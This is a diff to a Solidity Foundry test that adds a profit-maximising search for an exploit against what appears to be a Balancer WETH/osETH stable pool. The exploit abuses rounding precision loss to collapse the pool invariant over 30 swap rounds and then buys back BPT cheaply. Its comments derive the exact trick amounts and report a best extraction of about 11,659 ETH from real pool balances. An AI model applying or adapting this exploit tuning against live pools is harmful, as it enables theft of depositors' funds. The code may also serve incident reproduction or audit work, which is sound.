@@ -466,6 +466,92 @@ contract SearchParams is Test {
         require(upscaledNext > trickAmt + 1, "trickAmt+1 must break precision loss");
     }
 
+    /// @notice External wrapper so the search can try/catch the Phase 3 buyback.
+    function _phase3Ext(uint256 bW, uint256 bO, uint256 bptToBuy, uint256 supply, uint256 inv)
+        external
+        view
+        returns (uint256 wethCost, uint256 osethCost, uint256 bptBought)
+    {
+        return _simulateStep3RepaymentDetailed(bW, bO, bptToBuy, supply, inv);
+    }
+
+    /// @notice Profit-maximizing search over the CLOSED-FORM collapse set only.
+    ///
+    /// FINDING: the trickAmt values that can collapse D are NOT search-only -- they are exactly the
+    /// closed-form sequence  t_k = floor(k * 1e18 / (sf - 1e18)),  k = 1,2,3,...  (= 17, 34, 51, 68,
+    /// 86, 103, 120, ...). Verified both ways (min-D over 40 rounds, remain in [3000,200000]): deep
+    /// collapse (~99%) occurs at EXACTLY t = 17,34,51,68,86,103,120 (= t_k) and every non-t_k value
+    /// in between stays <= 0.66%. (17 = t_1 is the smallest, hence "smallest trickAmt that collapses
+    /// D".) Mechanism: the swap-2 upscale-premium leak needs floor((t+1)*d/1e18)-floor(t*d/1e18)==1
+    /// (d = sf-1e18), which holds iff t = floor(k*1e18/d) = t_k.
+    ///
+    /// So the trickAmt dimension is derivable; only the (t_k, remain) PAIRING (which t_k sustains 30
+    /// rounds at which remain, and the profit) is chaotic and needs search. This test does exactly
+    /// that -- tries only the t_k candidates against a remain grid, maximizing full 3-phase profit.
+    ///
+    /// RESULT (remain in [50000,250000] step 1000, k <= 100): best is
+    ///     t_5 = 86 @ remain = 240000  ->  ~11659.27 ETH
+    /// which beats t_2=34 @ 143000 (~11619.9) and t_1=17 @ 67000 (~11474.7), and matches the
+    /// "~11660 ETH @ remain 238000" note in _computeSwap3. Pattern: larger k (bigger t_k) drains
+    /// harder per round -> sustains a higher remain -> higher profit, until 30 rounds can no longer
+    /// collapse the (now huge) pool. (Grid-limited: finer step / higher remain may shift it slightly.)
+    ///
+    /// Env: WSWEEP_LO/HI = remain range, WSWEEP_STRIDE = remain step, KMAX = max k.
+    function test_searchTkProfit() public {
+        uint256 loR = vm.envOr("WSWEEP_LO", uint256(50000));
+        uint256 hiR = vm.envOr("WSWEEP_HI", uint256(250000));
+        uint256 stepR = vm.envOr("WSWEEP_STRIDE", uint256(1000));
+        uint256 kMax = vm.envOr("KMAX", uint256(100));
+        uint256 N = 30;
+        uint256 delta = sf[1] - FixedPoint.ONE;
+
+        (, uint256[] memory realBal,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        uint256 rw = realBal[0];
+        uint256 ro = realBal[2];
+        uint256 totalBPT = OSETH_BPT.getActualSupply();
+        uint256 bptTarget = totalBPT * BPT_TARGET_BPS / 10000;
+
+        int256 gBest = type(int256).min;
+        uint256 gTk;
+        uint256 gK;
+        uint256 gR;
+
+        for (uint256 R = loR; R <= hiR; R += stepR) {
+            Step1DetailedResult memory s1 = _simulateStep1ExtractionDetailed(rw, ro, R, totalBPT);
+            for (uint256 k = 1; k <= kMax; k++) {
+                uint256 tk = k * FixedPoint.ONE / delta; // t_k = floor(k*1e18/delta)
+                if (tk + 1 >= R) break; // larger k only grows tk -> swap1 underflows at round 0
+                // Phase 2: N-round cycling, stop early on revert
+                uint256 bW = R;
+                uint256 bO = R;
+                uint256 rounds = 0;
+                for (uint256 r = 0; r < N; r++) {
+                    try this.simulateOneRound(bW, bO, tk) returns (uint256 w, uint256 o) {
+                        bW = w; bO = o; rounds++;
+                    } catch { break; }
+                }
+                if (rounds != N) continue; // must complete 30 rounds (deep collapse)
+                // Phase 3 buyback
+                try this._phase3Ext(bW, bO, bptTarget, s1.remainingSupply, s1.lastPostJoinExitInvariant)
+                    returns (uint256 wc, uint256 oc, uint256 bb)
+                {
+                    if (bb < s1.totalBptSold) continue; // must repay >= BPT debt
+                    int256 netW = int256(s1.totalWethOut) + int256(R) - int256(bW) - int256(wc);
+                    int256 netO = int256(s1.totalOsethOut) + int256(R) - int256(bO) - int256(oc);
+                    int256 profit = netW + netO;
+                    if (profit > gBest) { gBest = profit; gTk = tk; gK = k; gR = R; }
+                } catch {}
+            }
+        }
+
+        console.log("=== t_k PROFIT SEARCH (closed-form candidates only) ===");
+        console.log("remain lo/hi:", loR, hiR);
+        console.log("step / kMax:", stepR, kMax);
+        console.log("### BEST t_k =", gTk, "k=", gK);
+        console.log("###   remain =", gR);
+        console.log("###   profit(wei) =", gBest);
+    }
+
     /// @notice Helper: compute invariant D for given balances (already in internal representation)
     function _getInvariant(uint256 balWETH, uint256 balOSETH) internal view returns (uint256) {
         uint256[] memory bal = new uint256[](2);
